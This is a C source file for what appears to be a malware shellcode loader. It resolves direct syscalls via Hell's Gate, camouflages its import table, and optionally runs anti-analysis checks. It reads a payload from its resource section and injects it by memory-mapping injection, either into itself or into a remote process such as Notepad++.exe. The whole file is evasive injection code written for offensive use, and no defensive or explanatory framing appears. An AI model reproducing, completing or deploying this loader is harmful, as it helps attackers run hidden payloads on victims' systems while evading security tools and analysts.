#include "HellsGate.h"
#include "Common.h"
#include "IatCamouflage.h"

//#define TEST

#define LOCAL_INJECTION

#ifndef LOCAL_INJECTION
#define TARGET_PROCESS L"Notepad++.exe"
#endif

//#define ANTI_ANALYSIS

int main() {
	// Init syscalls for use
	if (InitializeSyscalls() == FALSE) {
		PRINTA("[!] Failed To Initialize Syscalls\n");
		return -1;
	}

	// Load user32.dll for use
	LoadLibraryA("user32.dll");

	// Init WinApis for use
	if (InitializeWinApis() == FALSE) {
		PRINTA("[!] Failed To Initialize Windows APIs\n");
		return -1;
	}

	// IAT Camouflage
	IatCamouflage();

#ifdef TEST
#else
	PVOID pPayloadAddress = NULL;
	SIZE_T sPayloadSize = 0;
	DWORD dwPid = 0;
	HANDLE hProcess = NULL;

#ifdef ANTI_ANALYSIS
	// Anti-analysis techniques
	DWORD	seconds = 5;
	DWORD	dwMilliseconds = seconds * 1000;
	if (AntiAnalysis(dwMilliseconds) == FALSE) {
		PRINTA("File Is Being Analyzed!\n");
	}
#endif

	// Resource reading
	if (LoadPayloadFromResource(&pPayloadAddress, &sPayloadSize) != TRUE) {
		PRINTA("[!] Failed To Load Payload From The Resource\n");
		return -1;
	}
	PRINTA("[+] Load Payload To: %p Address Of Size: %d\n", pPayloadAddress, (INT)sPayloadSize);
	PrintHexData("ResourcePayload", pPayloadAddress, sPayloadSize);
#ifdef LOCAL_INJECTION
	RemoteMappingInjectionViaSyscalls(
		GetCurrentProcessHandle(),
		pPayloadAddress,
		sPayloadSize,
		TRUE
	);
#else
	// Process enumeration
	PRINTA("[i] Enumerating Processes...\n");
	if (GetRemoteProcessHandle(TARGET_PROCESS, &dwPid, &hProcess) != TRUE) {
		PRINTW(L"[!] Failed To Find Target Process %ls\n", TARGET_PROCESS);
		return -1;
	}
	PRINTW(L"[+] Found Taget Process: %ls with PID: %d And Handle: %p!\n", TARGET_PROCESS, dwPid, hProcess);

	RemoteMappingInjectionViaSyscalls(
		hProcess,
		pPayloadAddress,
		sPayloadSize,
		FALSE
	);
#endif

#endif

	return 0;
}